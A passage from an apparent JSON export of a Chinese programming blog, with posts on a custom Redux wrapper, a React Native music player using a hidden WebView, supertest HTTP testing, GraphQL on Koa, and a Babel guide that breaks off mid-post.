Redux-Fine 提供一个 modules 函数，此函数有 get/set 两个功能。当只有一个参数时，尝试获取 modules 的实例（如果不存在则报错），当有两个尝试时，就用于构建与初始化 module。 1const userModule = fine.modules('user'); 在 module 里规定了写法。 1234567891011121314151617class UserModule extends fine.Module &#123; // 使用 initState 代表着这个 module 的初始值，默认是 &#123;&#125; initState = &#123;&#125;; // 一个箭头函数就代表着一个 action getList = async () =&gt; &#123; // this.state 是指向本 module 的数据源，它是一个浅拷贝值。 const page = this.state.page; // this.store 是指向所有的数据源，它是一个浅拷贝值。 const page2 = this.store.user.page; &#125; // 非箭头函数，不会被识别为 action index() &#123; // ... &#125;&#125; Action在 Action 里的写法与之前的不同。首先不需要写 Action.Type，不需要调用 dispatch。提供一个 commit 函数，用于更新数据状态。 12345678910111213141516171819202122232425262728class UserModule extends fine.Module &#123; // 在 module 里可以获取 store 上下文 // 使用 initState 代表着这个 module 的初始值 initState = &#123;&#125;; // 这是一个 action 函数 getList = async () =&gt; &#123; // 一堆异步操作 // commit 是从 fine.Module 继承而来的一个方法。 // commit 是一个提交数据改变的接口，在 commit 回调函数里有两个参数 this.commit(state =&gt; &#123; return this.initState; &#125;); // commit 会有两个形式，commit(cb) 和 commit(moduleName, cb); this.commit('home', state =&gt; &#123; return &#123;...state &#125;; &#125;); // 当 commit 第一个参数为回调的时候，提交的数据改变只是改变本 module 的 state。 // 当 commit 第一个参数为字符串时，提交的数据会改变指定的 module（如果不存在则报错）的 state， // 这时候 commit 的参数为目标 mudule 的 state。 &#125; // 这是一个非 action 函数 index() &#123; // ... &#125;&#125; commit 的行为类似于 dispatch，但是它比 dispatch 做的更多事情。在原生的 Redux，如果要在 action 里执行异步操作，则需要使用 redux-thunk。在这里就不需要使用 thunk 了，你可以在任何异步操作完成后调用 commit 函数。 commit 是一个异步函数，可以使用 await commit 等待最新的状态值。如果没有 await commit，那么多个 commit 之间就是并发的形式。 123456const res = await this.commit(state =&gt; &#123; text: 'abc' &#125;);console.log(res); // &#123; text: 'abc' &#125;this.commit(state =&gt; &#123; console.log(state); // &#123; text: 'abc' &#125; return state;&#125;); 实际上并没有真正抹去 action.type，在框架内部还是要使用到 action.type。在框架里，调用一个 commit 时，会触发一个 type 为 模块名-时间戳 的 action。 为了方便获取 action，Redux-Fine 提供一个 actions 的函数，用于提取 module 的 action，只要是类方法并且是箭头函数都会被认为是 action。有两个个特殊除外，如果是 _xxx 则排除，如果方法是非使用 = 赋值的方式创建，那么也会排除（这部分是无法枚举出来）。因此可以利用这两点，区分 action 函数与非 action 函数。 12const actions = fine.actions('user'); // 返回一个对象// &#123; getList &#125; 为什么这样设计呢？在实际的项目了，我发现很多 Action 的引用都存在多级目录的引用的问题。使全局获取实例方式可以避免这个问题。 12// 不好的做法，多级目录带来层级太深import actions from '.../../../action/user'; 简单示例因为框架设计的内容比较少，代码也很少，在一定程度上是成功的。现在来一波测试看看有没有效果。 1234567891011121314151617181920212223242526272829import Fine from 'redux-fine';class HomeModule extends Fine.Module &#123; initState = &#123; list: [], loading: false, error: '' &#125;; getList = async () =&gt; &#123; const &#123; list &#125; = this.state; this.commit(state =&gt; (&#123; ...state, loading: true &#125;)); await new Promise(rs =&gt; setTimeout(rs, 1000)); this.commit(state =&gt; (&#123; ...state, list: list.concat([1, 2, 3]), loading: false, &#125;)); &#125;&#125;// 注册 moduleFine.modules('home', HomeModule);const store = Fine.store();const actions = Fine.actions('home');console.log(store.getState().home);// 调用一个 action 函数。actions.getList().then(res =&gt; &#123; console.log(store.getState().home);&#125;); 使用的顺序是先写 fine.module，最后才写 fine.store。因为这是在 Redux 里面的约束，在创建 Store 的时候需要确定的 Reducer，在创建完成后就不能再添加 Reducer 了。建议是一个 module 对应着一个 js 文件。 小结在 Redux 里有非常复杂的数据变化流程，看下图。 当使用 Redux-Fine 的时候，就没有了 reducer 和 dispatch 这部分，减少了大约 40% 的代码编写量。Redux-Fine 并没有最大多事情，只是简单化整个流程。Redux-Fine 核心代码只要 100 多行，在性能与体积大小上得以保证。 目前 Redux-Fine 并未开源。","categories":[{"name":"Redux","slug":"Redux","permalink":"http://me.lizhooh.com/categories/Redux/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/tags/React/"},{"name":"Redux","slug":"Redux","permalink":"http://me.lizhooh.com/tags/Redux/"}]},{"title":"📱 谈谈 React Native 音乐应用实现思路","slug":"React Native/Media/谈谈 React Native 音乐应用实现思路","date":"2018-06-23T14:21:08.000Z","updated":"2021-06-15T06:10:52.858Z","comments":true,"path":"/stories/2018/06/React Native/Media/谈谈 React Native 音乐应用实现思路/","link":"","permalink":"http://me.lizhooh.com/stories/2018/06/React Native/Media/谈谈 React Native 音乐应用实现思路/","excerpt":"前端React Native 可以做很多类型的应用，但是一般很少人用 React Native 做直播应用、视频应用、音乐应用。原因是 React Native 本身没有提供 Video/Audio 的组件，其次是第三方的组件支持力度不够。如果要开发这类型的应用很可能需要自己造轮子，这意味着要使用原生的代码写组件，并且要支持 Android 和 IOS，在开发时间上有点划不来。 下面的文章里介绍一种轻量级的 React Native 音乐应用实现思路。","text":"前端React Native 可以做很多类型的应用，但是一般很少人用 React Native 做直播应用、视频应用、音乐应用。原因是 React Native 本身没有提供 Video/Audio 的组件，其次是第三方的组件支持力度不够。如果要开发这类型的应用很可能需要自己造轮子，这意味着要使用原生的代码写组件，并且要支持 Android 和 IOS，在开发时间上有点划不来。 下面的文章里介绍一种轻量级的 React Native 音乐应用实现思路。 技术实现在 React Native 里实现一个音乐播放界面，说是界面实际上是需要功能的实现。包括了：音乐播放、音乐暂停、音乐进度控制、音乐下一首、音乐上一首、音乐列表、歌词滚动式查看。 对于音乐下一首、列表等实现比较简单。就是说一下比较难实现的： 音乐播放 音乐进度控制 歌词滚动 音乐播放对于音乐播放，开始想的是使用 React Native 的一个第三方 Video 组件：react-native-video。试了一下，现在连打包都编译失败，这个库仍有很多 BUG 还未修复（issues），想想还是算了，不知会遇到多少神坑。 后来想了一种比较稳的实现方式，就是使用 WebView 组件，在 HTML 里使用 Audio 实现音乐的播放/暂停等功能。具体的 UI 并不在 WebView 里实现，WebView 只负责把音乐解析并播放出声音就可以了。也就是，这个 WebView 完全可以设置为透明（不可见）状态。 音乐播放是使用 HTML5 Audio 标签实现的，Audio 提供了几个有用的属性： src：音乐的 URL。 autoplay：自动播放。 loop：循环播放。 preload： 在页面加载后，进行预加载。 on(‘timeupdate’)：播放时间改变时触发。 on(‘ended’)：播放结束。 play()：开始播放。 pause()：播放暂停。 on(‘volumechange’)：音乐声音大小改变时触发。 fastSeek()：在音频播放器中指定播放时间。 currentTime：设置或返回音频中的当前播放位置（以秒计）。 duration：返回音频的长度（以秒计）。 在了解这些属性与方法后，逻辑操作的反馈可以通过 WebView 与 React Native 的通信接口进行通信。 1234567891011121314151617181920212223242526272829303132// webviewconst html = data =&gt; ` &lt;audio src=\"$&#123;data.src&#125;\" id=\"audio\" /&gt; &lt;script&gt; // 推送 window.postMessage(JSON.string(&#123; name: 'abc', &#125;)); // 接收 document.addEventListener('message', e =&gt; &#123; const msg = e.data; &#125;); &lt;/script&gt;`// react native&lt;WebView style=&#123;&#123; width: 0, height: 0 &#125;&#125; javaScriptEnabled=&#123;true&#125; source=&#123;&#123; html &#125;&#125; startInLoadingState=&#123;false&#125; onMessage=&#123;e =&gt; &#123; // 接收 const date = e.nativeEvent.data; &#125;&#125; ref=&#123;f =&gt; this.webview = f&#125; /&gt;// 推送this.webview.postMessage(JSON.stringify(&#123; name: '123',&#125;)); 就这样一推一接的，类似命令的方式实现 WebView 与 React Native 之间的通信。要实现音乐的播放、暂停等真心不难了。 音乐进度控制对于音乐进度控制，一开始想是自己用基础组件和一些触摸事件造一个进度组件出来，后来想想实际上就是一个 Slider （滑块）的基础组件。只有设定 Slider 的范围为 0 ~ 100，就可以映射到 0% ~ 100% 的量。在拖动的时候，更加百分比动态计算音乐播放的位置即可。 设定音乐的进度是一个时间量（毫秒）。那么显示的进度时间值为： 123const ft = n =&gt; n &lt; 10 ? '0' + n : n;const t = currentTime;const currentText = ft(t / 60 % 60) + ':' + ft(t % 60); // =&gt; 03:02 currentTime 是一个动态的值，当拖动滑块时它应该是这样： 12// 当前位置 = 百分比 * 音乐长度（持续时间）currentTime = progress * 0.01 * duration; 最后，把进度值反馈给 Audio。 歌词滚动歌词的滚动，怎么说呢？说复杂也不复杂，说简单也不简单。装载歌词的容器需要是 ScrollView 或者 ListView。 歌词的滚动通过缓慢的控制 ScrollView 的滚动条位置，就可以实现了。 1this.scrollview.scrollTo(&#123; x: 0, y: 0, animated: true &#125;); 具体的位置需要精确的计算。中间高亮突出的歌词效果也要精确计算，一般来说歌词不会有很多行，这里的渲染性能是可以保证的。 那么怎么精确计算？ 假设拿到的歌词格式是这样，这里是一个数组（lyrics）。 12345678910111213141516171819202122[00:00.02]李玉刚 - 刚好遇见你[00:00.75]词：高进[00:00.85]曲：高进[00:00.94]编曲：关天天[00:13.13]我们哭了[00:15.79]我们笑着[00:18.83]我们抬头望天空[00:21.86]星星还亮着几颗[00:24.98]我们唱着[00:27.96]时间的歌[00:31.09]才懂得相互拥抱[00:33.98]到底是为了什么[00:37.30]因为我刚好遇见你[00:40.77]留下足迹才美丽[00:43.79]风吹花落泪如雨[00:46.80]因为不想分离[00:49.95]因为刚好遇见你[00:53.10]留下十年的期许[00:55.99]如果再相遇[00:59.21]我想我会记得你[01:14.32]我们哭了[01:17.23]我们笑着 实现的步骤分为四步： 第一步：先把时间转为以秒为单位的时间量。 12const [m, s] = item.replace(/\\[(.*)\\].*/, '$1').split(':');const t = m * 60 + s * 1; 第二步：找出 currentTime 最接近，但未超过的时间点。 12345678910111213function activeLyric(currentTime) &#123; let index = 0; for (let i = 0; i &lt; lyrics.length; i++) &#123; const item = lyrics[i]; const [m, s] = item.replace(/\\[(.*)\\].*/, '$1').split(':'); const t = m * 60 + s * 1; if (t &lt;= currentTime) index = i; else break; &#125; return index;&#125; 第三步：高亮此位置的文本。 123456789&lt;ScrollView&gt; lyrics.map(i =&gt; i.replace(/\\[.*\\](.*)/, '$1')).map((text, index) =&gt; ( &lt;View key=&#123;index&#125;&gt; index === activeLyric(currentTime) ? &lt;Text style=&#123;&#123; color: '#f45' &#125;&#125;&gt;&#123;text&#125;&lt;/Text&gt; : &lt;Text&gt;&#123;text&#125;&lt;/Text&gt; &lt;/View&gt; ))&lt;/ScrollView&gt; 第四步：歌词的自动滚动动画。大致的思路是，一开始插入半屏的空白区，每一个时间点就移动一次。移动的距离为每一项的高度，默认认为不会出现换行的情况，那就是每次移动的距离都是一样的。 12this.d += 20;this.scrollview.scrollTo(&#123; x: 0, y: this.d, animated: true &#125;); 小结对于一个音乐应用最核心的就是音乐播放，在 React Native 里实现音乐应用的思路也就是如此了。 上面的思路是凭空想出来的，在没有编写一行代码的情况下，写出来的，可以说是一个无实验性的理论值吧。最近比较忙，等有空的时候，写一个 Dome，验证一下效果，并补上 Dome Github 地址。 补充笔者发现一个在 React Native 上的音频库：react-native-sound，可以替代 HTML5 的方案。","categories":[{"name":"React Native","slug":"React-Native","permalink":"http://me.lizhooh.com/categories/React-Native/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"移动开发","slug":"移动开发","permalink":"http://me.lizhooh.com/tags/移动开发/"},{"name":"React-Native","slug":"React-Native","permalink":"http://me.lizhooh.com/tags/React-Native/"}]},{"title":"Nodejs HTTP 接口测试","slug":"测试/单元测试/Nodejs HTTP 测试","date":"2018-06-16T01:00:46.000Z","updated":"2021-06-15T06:10:52.919Z","comments":true,"path":"/stories/2018/06/测试/单元测试/Nodejs HTTP 测试/","link":"","permalink":"http://me.lizhooh.com/stories/2018/06/测试/单元测试/Nodejs HTTP 测试/","excerpt":"前言HTTP 接口测试是非常重要的一部分，当编写完成后端接口，很多时候需要手动的去使用 REST 客户端去测试，但是这样是很浪费时间的。为此，使用一些测试库来完成这件事情。 那么，到底该怎么做？百度？还是。。。不！对于学习一个未知的东西，最好的方法就是去看一些开源库，看一下他们使用的是什么大概就知道了。 看看 Koa 与 Express 的 HTTP 接口测试，可以发现它们都是使用 Jest、supertest、assert。","text":"前言HTTP 接口测试是非常重要的一部分，当编写完成后端接口，很多时候需要手动的去使用 REST 客户端去测试，但是这样是很浪费时间的。为此，使用一些测试库来完成这件事情。 那么，到底该怎么做？百度？还是。。。不！对于学习一个未知的东西，最好的方法就是去看一些开源库，看一下他们使用的是什么大概就知道了。 看看 Koa 与 Express 的 HTTP 接口测试，可以发现它们都是使用 Jest、supertest、assert。 好了，下面就讲讲这么使用这些库来做 HTTP 接口测试。 supertestsupertest 是一个 HTTP 的测试工具库，它的行为类似于 fetch 等网络库。不同的是 supertest 是更注重于 HTTP 测试方面。 下面的一个示例，使用 supertest 测试 Koa 路由接口。 1234567891011121314151617181920212223const request = require('supertest');const assert = require('assert');const Koa = require('koa');const Router = require('koa-router');const app = new Koa();const router = new Router();router.get('/user', async (ctx, next) =&gt; &#123; ctx.body = &#123; name: 'john' &#125;;&#125;);app.use(router.routes());request(app) .get('/user') .expect('Content-Type', /json/) .expect('Content-Length', '15') .expect(200) .end((err, res) =&gt; &#123; if (err) throw err; assert.equal(res.body, &#123; name: 'john' &#125;); &#125;); 上面就完成了一个很漂亮的 HTTP 测试过程，对 /user 路径进行测试。 supertest 在每次使用 url 并不是必须的，可以先设置 url，在后面使用的时候，只需要指定路由即可。 123456789request = request('http://127.0.0.1:3000');request.get('/').expect(200, err =&gt; &#123; console.log(err);&#125;);request.get('/').expect('heya', err =&gt; &#123; console.log(err);&#125;); HTTP Method在测试时，更多关注的是 HTTP 不同的请求方法测试。supertest 的请求方法直接 request.xxx 即可，跟其他网络就是一样的。 123456789101112request(app) .post('/user') .send('name=john') // x-www-form-urlencoded upload .set('Accept', 'application/json') // accept .expect(function(res) &#123; res.body.id = 'some fixed id'; res.body.name = res.body.name.toUpperCase(); &#125;) .expect(200, &#123; id: 'some fixed id', name: 'john' &#125;, done); 在默认情况下，post 等请求的内容是字符串，那么 supertest 会判定为 x-www-form-urlencoded upload。如果请求的内容是对象，那么 supertest 会判定为 application/json。 12345request(app) .post('/user') .send(&#123; name: 'a', &#125;) // application/json 文件上传supertest 还支持文件上传测试。恐怖。 1234request(app) .post('/') .field('name', 'my awesome avatar') // file 字段 .attach('avatar', 'test/fixtures/avatar.jpg'); // 文件 Cookiescookie 常被用于用户认证里，supertest 里也可以对 cookie 进行测试。 123456789101112131415161718192021222324252627282930const request = require('supertest');const should = require('should');const Koa = require('koa');const Router = require('koa-router');describe('request.agent(app)', function() &#123; const app = new Koa(); const router = new Router(); router.get('/user', async (ctx, next) =&gt; &#123; ctx.cookies.set('cookie', 'hey'); ctx.body = &#123; name: 'john' &#125;; &#125;); router.get('/return', function(req, res) &#123; ctx.body = ctx.cookies.get('cookie') || ':('; &#125;); app.use(router.routes()); const agent = request.agent(app); it('should save cookies', function(done) &#123; agent.get('/').expect('set-cookie', 'cookie=hey; Path=/', done); &#125;); it('should send cookies', function(done) &#123; agent.get('/return').expect('hey', done); &#125;);&#125;) 结合 Jest先说明，在这里 supertest 是充当网络库的角色，而 Jest 充当的是断言库的角色，如果不使用 Jest 可以使用 Nodejs 自带的 assert。 12345678910111213141516const app = request('../');const request = require('supertest');describe('REST API 测试', () =&gt; &#123; test('GET /users', () =&gt; &#123; request(app) .get('/users') .expect('Content-Type', /json/) .expect(200) .end((err, res) =&gt; &#123; expect(res.body).toEqual(&#123; name: 'abc', &#125;); &#125;) &#125;);&#125;); 参考资料 https://github.com/koajs/koa/blob/master/test/application/index.js https://github.com/visionmedia/supertest","categories":[{"name":"测试","slug":"测试","permalink":"http://me.lizhooh.com/categories/测试/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"},{"name":"测试","slug":"测试","permalink":"http://me.lizhooh.com/tags/测试/"}]},{"title":"使用 GraphQL 取代 REST 的开始","slug":"GraphQL/使用 GraphQL 取代 REST 的开始","date":"2018-06-07T17:03:08.000Z","updated":"2021-06-15T06:10:52.820Z","comments":true,"path":"/stories/2018/06/GraphQL/使用 GraphQL 取代 REST 的开始/","link":"","permalink":"http://me.lizhooh.com/stories/2018/06/GraphQL/使用 GraphQL 取代 REST 的开始/","excerpt":"前言REST FUL 架构是业界比较流行的 API 接口设计规范。在近几年里随着 GraphQL 的诞生，REST FUL 似乎遇到了前所未有的挑战，无法否认任何的新技术出现都是为了取代旧的技术。 GraphQL 既是一种用于 API 的查询语言也是一个满足你数据查询的运行时。 GraphQL 对你的 API 中的数据提供了一套易于理解的完整描述，使得客户端能够准确地获得它需要的数据，而且没有任何冗余，也让 API 更容易地随着时间推移而演进，还能用于构建强大的开发者工具。","text":"前言REST FUL 架构是业界比较流行的 API 接口设计规范。在近几年里随着 GraphQL 的诞生，REST FUL 似乎遇到了前所未有的挑战，无法否认任何的新技术出现都是为了取代旧的技术。 GraphQL 既是一种用于 API 的查询语言也是一个满足你数据查询的运行时。 GraphQL 对你的 API 中的数据提供了一套易于理解的完整描述，使得客户端能够准确地获得它需要的数据，而且没有任何冗余，也让 API 更容易地随着时间推移而演进，还能用于构建强大的开发者工具。 下面的文章里将介绍，如何使用 GraphQL 取代 REST，重新定义你的后端 API 服务，当然是 Nodejs 后端。 GraphQL IDE：https://github.com/prismagraphql/graphql-playground学习文档：http://graphql.cn/learn/ 连接 Koa下面介绍如何在 Koa 里搭建 GraphQL 的服务，实际上也非常简单，因为 apollo 帮我们做了很多事情了。 连接 Koa 需要使用 apollo 提供了一个库：apollo-server-koa 即可，非常简单。 除了使用 apollo-server-koa 之外，还可以使用 koa-graphql 这个中间件。 12345678910111213141516171819202122const &#123; graphqlKoa, graphiqlKoa &#125; = require('apollo-server-koa');const Koa = require('koa');const Router = require('koa-router');const logger = require('koa-logger');const bodyparser = require('koa-body');const schema = require('./schema'); // &lt;-- 上面的模型实例const app = new Koa();const router = new Router();router.post('/graphql', graphqlKoa(&#123; schema &#125;)); // &lt;-- 一定要 post 请求app .use(logger()) .use(bodyparser()) .use(router.routes()) ;app.listen(3000, () =&gt; &#123; console.log('server run in 3000.');&#125;); 启动之后，在 GraphQL IDE 里输入 http://127.0.0.1:3000/graphql 可以使用 GraphQL 的调试工具了。 定义模型 GraphQL 的模型对象来定义模型有比较原始的方式，也有使用第三方工具的方式，建议是使用 graphql-tools。 在之前定义模型，需要使用很多 API。这样特别麻烦。 12345678910const &#123; graphql, GraphQLSchema, GraphQLObjectType, GraphQLString, GraphQLID, GraphQLList, GraphQLNonNull, isOutputType,&#125; = require('graphql'); 而现在使用 graphql-tools，只需要编写 GraphQL 模型字符串即可。那么，下面来看看 graphql-tools 是怎么使用的。 在根目录下，创建一个 schema.gql 用于编写模型代码（记得 vscode 安装 GraphQL 高亮插件）。 12345678910111213141516171819202122232425262728# schema.gql# 用户模型type User &#123; id: String name: String&#125;# 作者模型type Author &#123; id: String name: String posts: [Post]&#125;# 帖子模型type Post &#123; id: String title: String text: String views: Int author: Author&#125;# 查询内容模型type Query &#123; author(name: String): Author getFortuneCookie: String&#125; 在上面的代码表明，定义了三个模型。Query 模型用于查询的时候使用，也就是查询只能是 author 和 getFortuneCookie。 这是一开非常好的开始，模型代码与 js 分离。接着，加载模型代码，并且编写 resolver。 Resolvers接下来创建一个 schema.js 文件，用于处理数据返回的逻辑。 12345678910111213141516171819202122232425262728293031323334353637// schema.jsconst &#123; makeExecutableSchema &#125; = require('graphql-tools');const fs = require('fs');// Actionconst resolvers = &#123; Query: &#123; author: (root, args) =&gt; (&#123; id: '1', name: '小明' &#125;), random: () =&gt; Math.random().toString(32), &#125;, Author: &#123; // 定义 author 中的 posts，返回的数据内容 posts: author =&gt; ([ &#123; id: '1', title: 'A post', text: 'Some text', views: 2 &#125;, &#123; id: '2', title: 'Another post', text: 'Some other text', views: 200 &#125; ]), &#125;, Post: &#123; views: () =&gt; 1, // 定义 Post 里面的 author，返回的数据内容 author: post =&gt; (&#123; id: '1', name: '小明', &#125;), &#125;,&#125;;// makeExecutableSchema 是将 Schema 结构的数据转换成 GraphQLSchema 实例。const schema = makeExecutableSchema(&#123; typeDefs: fs.readFileSync('./schema.gql').toString(), resolvers: resolvers&#125;);module.exports = schema; graphql-tools 很简单，编写好模型之后，再编写 resolvers，把 schema 与 resolvers 传给 makeExecutableSchema，即可得到 GraphQL 所需要的模型实例。 上面的代码里有个 resolvers，那么 resolvers 是什么？总体而言，可以把 GraphQL 抽象成数据管道，管道的前端是 Schema，管道的后端是 Resolvers，管道的两端使用 GraphQL schema 作为通信语言，前端向后端发出数据请求，后端响应前端的请求后提供数据，前端可以对后端数据库透明地执行增删查改（CRUD）操作。那么 Resolvers，管道的两端使用 就是决定前端某个行为的，产生内容（就是返回什么数据）。 大致的思路如下！ 首先，Query 模型决定了查询的范围。 12345# 查询内容模型type Query &#123; author(firstName: String, lastName: String): Author random: String&#125; 其次是 resolver 决定了返回的内容。 1234567const resolvers = &#123; Query: &#123; // ... random: () =&gt; Math.random().toString(32), &#125;, // ...&#125; 当查询的时候，会根据 schema 中的 Query 限制查询的属性，根据 resolvers 限制查询的内容。 显而易见，返回的是执行了 resolvers.Query.getFortuneCookie() 的结果。 那么当查询 Author 的 post 时会怎样？ 很明显返回的是 Author.post() 的部分结果。那么这到底是怎么回事呢？当查询 author.post 时，GraphQL 会去到 resolvers 对应模型的层次下寻找 post 函数，调用它并筛选数据。 注意：resolver 需要与 schema 结果对应。也就是 Query 模型，对应着 resolver.Query，Auther 模型对应着 resolver.Author。 增删改查既然 GraphQL 要取代 REST，那么在 GraphQL 里如何实现增删改查？在 GraphQL 里，Query 是对应数据库的查询操作，Mutation 则对应数据库的更新操作。 首先，在 schema.gql 里添加 Mutation。 1234type Mutation &#123; # 创建用户 createUser (name: String!): Author&#125; 接着在 resolvers 里添加 Mutation 的逻辑。 123456789Mutation: &#123; createUser(root, args) &#123; const name = args.name; const id = Math.random().toString(32).slice(2); // 在这里进行数据的插入操作 // db.user.insert(&#123; name &#125;); return &#123; id, name &#125;; &#125;,&#125;, 创建好之后，就可以对它进行操作了。 在这里只是一个 create 操作，对于 query、update、remove 也同样如此。 用户认证在 GraphQL 里实现用户认证比较复杂。 已经登录的用户发出 GraphQL 查询，未登录的用户不可以。认证在非 GraphQL 节点完成。所有用户都可以发出 GraphQL 查询，未登录用户可以使用其中的一个子集。认证在非 GraphQL 节点完成。所有用户都可以发出 GraphQL 查询，认证就由 GraphQL 节点完成。 对于第一种方式，实现起来比较简单（也是普遍的做法），就是在 GraphQL 前添加一个认证中间件。 对于第二种方式，实现起来比较复杂。① 需要一个认证中间件，② 需要切分模块。 对于第三种方式，实现起来比较复杂。可以利用 Mutation 实现 Token 认证，还需要在每一个 Query 里都一个查询拦截。 123456789101112131415router.post('/gql-api', async (ctx, next) =&gt; &#123; if (ctx.request.body.query.indexOf('mutation') &gt; -1) &#123; const isLogin = !!ctx.session.user; if (isLogin) &#123; return graphqlKoa(&#123; schema &#125;)(ctx, next); &#125; else &#123; console.log('未登录'); ctx.body = &#123; status: 403 &#125;; &#125; &#125; else &#123; return graphqlKoa(&#123; schema &#125;)(ctx, next); &#125;&#125;); 上面的示例表明，当为 mutation 操作时就需要用户信息。 12345678910111213type Token &#123; status: Boolean token: String error: String&#125;type Mutation &#123; # Token 认证 createToken(account: String, password: String): Token checkToken(token: String): Token destroyToken(token: String): Token&#125; 如果，认证通过，token 就不为 null，否则就 。。。 123456789101112131415161718192021createToken(root, &#123; account, password &#125;) &#123; return &#123; status: null, token: null, error: '创建失败，帐号或密码不正确。', &#125;&#125;,checkToken(root, &#123; token &#125;) &#123; return &#123; status: true, // 验证通过 token: null, error: null, &#125;&#125;,destroyToken(root, &#123; token &#125;) &#123; return &#123; status: true, // 销毁成功 token: null, error: null, &#125;&#125; GraphQL 的类型是确定的，也就是不能出现像 Typescript 里的 Any，Number | Array 这中多类型的写法，这意味着只能通过确定的模型，返回相应数据。 前端查询后端部署了 GraphQL 之后，在前端里如何查询呢？在前端里可以使用一些现成的网络库实现功能。 graphql-request graphql-fetch 或者使用 fetch 请求。 1234567891011121314const query = `&#123; getFortuneCookie &#125;`;const variables = ``;fetch(url, &#123; method: 'POST', headers: &#123; 'content-type', 'application/json', &#125;, body: JSON.stringify(&#123; query, variables &#125;)&#125;).then(res =&gt; res,json()); 日志处理当用户请求 GraphQL 的接口时，在日志系统里完全分不清除请求的是哪个 API，好下面就来解决这个问题。 大致的处理思路是，在 resolver 处做一个拦截，也就是钩子函数。 12345678910111213141516171819202122232425const deepForEach = require('deep-for-each');const isFunction = require('is-function');const createGraphQLLogger = (options = &#123;&#125;) =&gt; resolvers =&gt; &#123; const logger = options.logger || console.log.bind(console); // deepForEach 是一个用于深度遍历对象的属性的函数 deepForEach(resolvers, (value, prop, subject, path) =&gt; &#123; // 如果是函数 if (isFunction(value)) &#123; // 前缀 const query = options.prefix ? options.prefix + path : path; // 对此函数包一个闭包 subject[prop] = async function wrapped(...args) &#123; // 计算时间等 const start = Date.now(); const result = await value(...args); const end = Date.now(); logger(`$&#123;query&#125; - $&#123;end - start&#125; ms`); return result; &#125;; &#125; &#125;); return resolvers;&#125;; 这种方式，还是比较直接，那么不能获取 koa 的 ctx 对象了？ 在配置里是可以配置上下文对象的，这样的话，可以往 ctx 里添加信息，在下一个中间件里输出信息。 1router.post('/graphql', graphqlKoa(ctx =&gt; (&#123; schema, context: &#123; ctx &#125; &#125;)));","categories":[{"name":"GraphQL","slug":"GraphQL","permalink":"http://me.lizhooh.com/categories/GraphQL/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"},{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/tags/Nodejs/"},{"name":"Koa","slug":"Koa","permalink":"http://me.lizhooh.com/tags/Koa/"},{"name":"GraphQL","slug":"GraphQL","permalink":"http://me.lizhooh.com/tags/GraphQL/"}]},{"title":"Babel 使用指南","slug":"前端/Babel 使用指南","date":"2018-06-05T01:16:56.000Z","updated":"2021-06-15T06:10:52.903Z","comments":true,"path":"/stories/2018/06/前端/Babel 使用指南/","link":"","permalink":"http://me.lizhooh.com/stories/2018/06/前端/Babel 使用指南/","excerpt":"前言Babel 是一个 JavaScript 编译器，可用于对未来的 JavaScript 语法进行编译，变成符合现代浏览器的语法要求。 平时用一些脚手架 Webpack、Babel 什么的配好了，对 Babel 的配置可是半知半解。接下来，这篇文章将介绍 Babel 的基本使用方法，以及常见的配置场景。","text":"前言Babel 是一个 JavaScript 编译器，可用于对未来的 JavaScript 语法进行编译，变成符合现代浏览器的语法要求。 平时用一些脚手架 Webpack、Babel 什么的配好了，对 Babel 的配置可是半知半解。接下来，这篇文章将介绍 Babel 的基本使用方法，以及常见的配置场景。 在浏览器里使用在浏览器里面使用 Babel，直接引入 Babel 的文件即可。 12345678&lt;div id=\"output\"&gt;&lt;/div&gt;&lt;!-- 加载 Babel --&gt;&lt;script src=\"https://cdn.bootcss.com/babel-standalone/6.26.0/babel.min.js\"&gt;&lt;/script&gt;&lt;!-- 你的脚本代码 --&gt;&lt;script type=\"text/babel\"&gt; const getMessage = () =&gt; \"Hello World\"; document.getElementById('output').innerHTML = getMessage();&lt;/script&gt; 那么，它是一个如何的运行原理呢？首先，ES6 代码必须放在 babel 之后，接着 babel 会找到所有的 type 为 text/babel 的标签，并获取其内容进行编译，编译完成后再动态的执行代码。 123const es = document.querySelector('script[type=text/babel]').innerHTML;const js = babel.build(es);eval(js); .babelrc.babelrc 是 babel 的一个配置文件，可用于指定 Babel 的编译方式。 例如下面的例子有三个配置项。presets 是 Babel 的预设集合， plugins 是指定使用的编译插件，ignore 是忽略编译的文件。 123456789101112&#123; \"presets\": [ \"env\", \"react\", \"stage-2\" ], \"plugins\": [\"transform-react-jsx\"], \"ignore\": [ \"foo.js\", \"bar/**/*.js\" ]&#125; 实际上在 presets 的预设集合里，react 就包括了 transform-react-jsx 的功能，因此可以把 plugins 去掉。 babel 的 presets 安装是有规律的，大致为 babel-preset-xxx、babel-plugins-xxx。 1234babel-preset-envbabel-preset-reactbabel-preset-stage-2babel-plugin-transform-class-properties 有一个 env 可用于在不同的开发环境下进行编译。例如，下面的 env 配置，在生产环境下使用 transform-react-constant-elements 插件。 1234567&#123; \"env\": &#123; \"production\": &#123; \"plugins\": [\"transform-react-constant-elements\"] &#125; &#125;&#125; env 选项的值将从 process.env.BABEL_ENV 获取，如果没有的话，则获取 process.env.NODE_ENV 的值，它也无法获取时会设置为 “development” （默认值）。 babel registerbabel register 的功能就是给 require 添加钩子，从而实现 node 的 require 自动编译代码。 例如，下面的代码，babel 会往 require 里添加钩子。 1234567891011121314require('babel-core/register')(&#123; ignore: [/node_modules/], presets: [ 'stage-2', 'react', [ \"latest-node\", &#123; \"target\": \"current\" &#125; ], ]&#125;);require('babel-polyfill');require('./index'); babel apibabel 提供了一些 api，可用于实现动态编译，这些 api 充分的使用在 Webpack 的 babel-loader 里。 babel.transform(code: string, options?: Object) babel.transformFile(filename: string, options?: Object, callback: Function) 123456789const options = &#123;&#125;;const code = ` const a = [1, 2, 3]; const b = [...a, 4];`;babel.transform(code, options); // =&gt; &#123; code, map, ast &#125;babel.transformFile('./text.js', options, res =&gt; &#123; // =&gt; &#123; code, map, ast 